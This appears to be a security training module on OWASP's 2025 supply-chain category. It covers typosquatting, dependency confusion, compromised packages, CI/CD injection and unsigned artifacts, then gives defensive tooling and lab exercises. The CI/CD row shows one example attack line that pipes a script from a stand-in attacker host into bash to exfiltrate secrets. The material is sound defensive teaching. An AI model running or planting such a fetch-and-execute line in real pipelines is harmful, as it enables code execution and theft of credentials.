| **MODULE 7 — A03: SOFTWARE SUPPLY CHAIN FAILURES** *Attack taxonomy · Detection tools · SBOM · Build-pipeline integrity · Lab exercises* A03 Software Supply Chain Failures  ·  BBC Academy / JBI Training  ·  19–20 March 2026 |
| --- |

| **What changed from A06:2021 → A03:2025** A06:2021 "Vulnerable and Outdated Components" asked: are your dependencies patched? A03:2025 "Software Supply Chain Failures" asks: has your supply chain been compromised? The scope now covers malicious upstream packages, compromised build pipelines, dependency confusion, and the absence of SBOMs — none of which a version check alone would detect. |  | **Why this matters: the XZ Utils case study** Canonical incident: XZ Utils backdoor (CVE-2024-3094, CVSS 10.0). A trusted maintainer was social-engineered over two years. The backdoor was in the release tarball, not the git source. pip-audit and Dependabot would not have caught it on day zero. The defensive shift: verify integrity (hashes, signatures), monitor provenance (SBOM, SLSA), and treat the build pipeline as an attack surface, not just a convenience. |
| --- | --- | --- |

| **ATTACK TAXONOMY***  —  Five supply-chain attack types, real examples, and mitigations* |
| --- |

| **Attack Type** | **Root Cause** | **Canonical Example** | **Attack Method** | **Detection ****&**** Mitigation** |
| --- | --- | --- | --- | --- |
| **Typosquatting** *Registry Attack* | Attacker publishes a malicious package with a name that is a common typo or visual lookalike of a popular package (e.g. "reqeusts", "djano", "colourama"). | colourama (PyPI, 2017): typo of colorama (downloaded 500K times before removal). Installed a keylogger that exfiltrated data on Windows. The legitimate colorama has 200M+ monthly downloads. | Developer makes a typo in a pip install command or requirements.txt. Automated pip install in CI runs the malicious setup.py at install time, with the full privileges of the CI runner. | pip install --require-hashes -r requirements.txt — hash pinning rejects any package whose content does not match the expected SHA-256, regardless of name. pip-compile --generate-hashes requirements.in — generates a locked requirements.txt with hashes for every dep. |
| **Dependency Confusion (Namespace Hijacking)** *Registry Attack* | An organisation uses an internal package registry with private package names. Attacker publishes a public package with the same name but a higher version number. pip (and npm, gem) resolve public registries first by default. | Ethical research (Alex Birsan, 2021): 35 major companies including Apple, Microsoft, PayPal, and Tesla were compromised. Internal package names discovered via npm/pip metadata, public packages uploaded with v99.0.0. All companies paid bug bounties; the technique works at scale. | Internal CI runs pip install company-internal-lib. pip finds v99.0.0 on PyPI (attacker-controlled), prefers it over the internal registry v1.2.3, and installs the malicious package. | # Configure pip to use ONLY internal registry: [global] index-url = https://pypi.internal.example.com/simple/ no-index = true # Or allowlist both but pin hashes: --extra-index-url https://pypi.internal.example.com/simple/ # pip-audit can flag packages present in both registries. |
| **Compromised Legitimate Package** *Maintainer Attack* | A legitimate, widely-trusted package is modified after the fact — either by the original maintainer being coerced or social-engineered, by an account takeover, or by a malicious new maintainer given access to a neglected package. | XZ Utils (CVE-2024-3094, CVSS 10.0): maintainer social-engineered over 2+ years. Backdoor hidden in release tarball M4 macros, not in git source. event-stream (npm, 2018): maintainer transferred package to attacker; malicious code targeted Copay Bitcoin wallet in a transitive dependency. | Nothing unusual — developer installs the latest version of a trusted package. The malicious code executes at install time (setup.py), import time, or at runtime in the target environment only (XZ Utils triggered only in systemd-linked builds — evading most test environments). | # Verify release tarballs against published signatures: gpg --verify package-2.0.tar.gz.sig package-2.0.tar.gz # Generate SBOM to track exact provenance: cyclonedx-py environment -o sbom.json # Monitor for unexpected new maintainers: deps.dev — Google Open Source Insights socket.dev — flags maintainer changes in real-time |
| **Build Pipeline Compromise (CI/CD Injection)** *Pipeline Attack* | The CI/CD pipeline itself becomes an attack surface. A pull request injects malicious commands into a workflow file, a reusable Action is compromised, or pipeline secrets are exfiltrated via a log statement — all without touching the application code. | Codecov breach (2021): attacker modified the Codecov bash uploader script hosted on codecov.io. Every CI pipeline running curl │ bash executed the malicious script and exfiltrated environment variables including cloud credentials and API tokens. Thousands of organisations affected. | # Malicious PR adds to .github/workflows/ci.yml: - run: curl https://evil.site/exfil.sh │ bash Or: a reusable Action pinned by tag (uses: owner/action@v2) is compromised when the tag is moved to a new commit. curl │ bash in CI is the classic entry point. | # Pin Actions by full commit SHA, not tag: uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # not: uses: actions/checkout@v4 (tag can be moved) # Never: curl https://external.site │ bash in CI # Use SLSA provenance: slsa-verifier verify-artifact --provenance-path provenance.json\   --source-uri github.com/org/repo dist/package.whl # Secrets: use OIDC tokens, not long-lived credentials |
| **Unsigned / Unverified Artifacts** *Integrity Failure* | Release artifacts (Python wheels, Docker images, binaries) are distributed without cryptographic signatures or hash verification. A man-in-the-middle, a compromised CDN, or a mirroring error can replace a legitimate artifact with a malicious one undetected. | Linux Mint website compromise (2016): ISO image on the official site replaced with a backdoored version. No signature verification meant users installed malware. The official SHA-256 on the same compromised site was also updated — demonstrating that hashes and signatures must be published on a separate, trusted channel. | pip install without --require-hashes downloads and installs whatever PyPI (or a mirror) returns. If the mirror is compromised or the CDN is manipulated, the installed file may not match what the maintainer published. | # requirements.txt with hashes (generated by pip-compile): flask==3.1.1 \   --hash=sha256:a5e3f4c64a3f... # Sigstore / pip verify (emerging standard): pip install --verify sigstore flask # Docker: sign and verify images: cosign sign ghcr.io/org/app:sha256-abc123 cosign verify ghcr.io/org/app:latest # For npm equivalent: npm ci uses package-lock.json integrity field |

| **DETECTION TOOLS ****&**** SBOM***  —  Tools for your VM lab  ·  Run pip-audit, cyclonedx-py, trufflehog in Module 7* |
| --- |

| **Tool** **What It Does** **Key Commands ****&**** Notes** **pip-audit** Scans installed packages or requirements.txt against OSV, PyPI Advisory DB, and NVD. Returns CVE IDs and fix versions. *See CVE Triage Card for CVSS scoring of findings.* pip-audit -r requirements.txt pip-audit -r requirements.txt --format json **pip-compile --generate-hashes** Locks all dependencies (including transitive) with SHA-256 hashes. Required for --require-hashes enforcement. *Hash pinning defeats typosquatting and mirror compromise.* pip install pip-tools pip-compile --generate-hashes requirements.in # produces requirements.txt with hashes **cyclonedx-py** Generates a CycloneDX Software Bill of Materials (SBOM) from the current Python environment. *Share the SBOM with downstream consumers so they can assess impact of your dependencies.* pip install cyclonedx-bom cyclonedx-py environment -o sbom.json cyclonedx-py requirements -i requirements.txt -o sbom.json **trufflehog git** Scans git history (including deleted commits) for secrets, API keys, and credentials accidentally committed. *Run against the full repo history, not just HEAD. A deleted secret is still exploitable.* trufflehog git . --only-verified gitleaks detect --source . -v **socket.dev / deps.dev** Online supply chain monitoring. Flags maintainer changes, new install scripts, obfuscated code, and typosquatting patterns in real-time. *Particularly useful for detecting compromised maintainer events before CVEs are published.* # Web UI: socket.dev / deps.dev npm install -g @socketsecurity/cli socket scan --org your-org |  | **SBOM ****&**** Provenance — What A03:2025 Demands** **What is an SBOM?** A Software Bill of Materials is a machine-readable inventory of every component in your software: direct dependencies, transitive dependencies, version numbers, licences, and — critically — the provenance of each component (where it came from, who signed it). **Why does A03:2025 care?** Log4Shell (2021) affected tens of thousands of organisations that did not know they had log4j in their stack — embedded in transitive dependencies three or four levels deep. An SBOM would have made the affected surface area immediately queryable. **CycloneDX vs SPDX** CycloneDX (OWASP standard) is optimised for security use cases and vulnerability correlation. SPDX (Linux Foundation) is optimised for licence compliance. Either satisfies the UK NCSC and US CISA SBOM guidance. CycloneDX is the better choice for integration with pip-audit and Grype. **SLSA (Supply-chain Levels for Software Artifacts)** Google-initiated framework with four levels of build provenance assurance. SLSA Level 2 requires a hosted build service (GitHub Actions, Google Cloud Build) to produce a signed provenance attestation linking source commit to output artifact. slsa-verifier verify-artifact confirms the artifact you downloaded was produced by the expected source at the expected commit. **Lab connection** On your VM, run cyclonedx-py environment -o sbom.json then inspect the output. Then run pip-audit -r requirements_vulnerable.txt and note which CVEs in the output are for packages your SBOM lists as direct dependencies vs transitive dependencies — this distinction changes the urgency of the patch decision. |
| --- | --- | --- |

| **BUILD PIPELINE INTEGRITY***  —  Five CI/CD controls  ·  Lab exercises using requirements_vulnerable.txt* |
| --- |

| **Pipeline Control** **How (Command / Config)** **Risk if Missing** **Pin GitHub Actions by full SHA, not tag** uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 A moved tag silently switches the Action to attacker-controlled code. **Never use curl │ bash in CI** # Instead: download, verify hash, then run: curl -fsSL https://example.com/install.sh -o install.sh sha256sum --check install.sh.sha256 bash install.sh Codecov breach vector. Any compromise of the remote server gives arbitrary code execution. **Use OIDC short-lived tokens, not stored secrets** # GitHub Actions → AWS: permissions:   id-token: write steps:   - uses: aws-actions/configure-aws-credentials@v4     with:       role-to-assume: arn:aws:iam::123:role/GitHubActions Long-lived secrets in CI env vars are the primary supply chain exfil target. **Require hash-pinned requirements in CI** pip install --require-hashes -r requirements.txt Without hashes, a compromised mirror or PyPI account can substitute a malicious wheel undetected. **Fail the build on HIGH/CRITICAL CVEs** # GitHub Actions step: - name: Audit   run: pip-audit -r requirements.txt # Exit code 1 on findings = PR blocked Without automated gating, vulnerable dependencies accumulate silently (cf. Equifax, 2017). |  | **Lab Activity — Module 7 VM Exercises** **Step 1: **Run pip-audit against requirements_vulnerable.txt on your VM: pip3 install pip-audit --break-system-packages pip-audit -r ~/vuln_flask_app/module4_owasp_bingo/requirements_vulnerable.txt **Step 2: **For each HIGH or CRITICAL finding, look up the full CVSS vector on nvd.nist.gov and apply the three-step triage from the CVE Triage Card. **Step 3: **Install cyclonedx-py and generate an SBOM for your VM's Python environment: pip3 install cyclonedx-bom --break-system-packages cyclonedx-py environment -o ~/sbom.json cat ~/sbom.json │ python3 -m json.tool │ less **Step 4: **Count how many components are in your SBOM. How many did you install intentionally vs transitively? cat ~/sbom.json │ python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('components',[])))" **Step 5: **Extension: search the SBOM for a package name found in your pip-audit output. Note whether it is a direct or transitive dependency — this changes your patch priority. grep -i "werkzeug" ~/sbom.json *Discussion: which findings in requirements_vulnerable.txt are exploitable with AV:N/PR:N — network-reachable, no authentication required? Which require conditions your application does not have?* |
| --- | --- | --- |

| **UNIFYING PRINCIPLE:  **A supply chain attack exploits trust. You trust your package registry. Your registry trusts its maintainers. Your build pipeline trusts its runners. Attackers do not need to compromise your code — they compromise something you trust. The three defences are: **verify integrity **(hashes, signatures), **track provenance **(SBOM, SLSA attestations), and **minimise trust surface **(pin versions, pin SHAs, use OIDC, gate on CVE scans in CI). The old question was "is this version patched?" — the new question is "can I verify that what I installed is what the maintainer published?" |
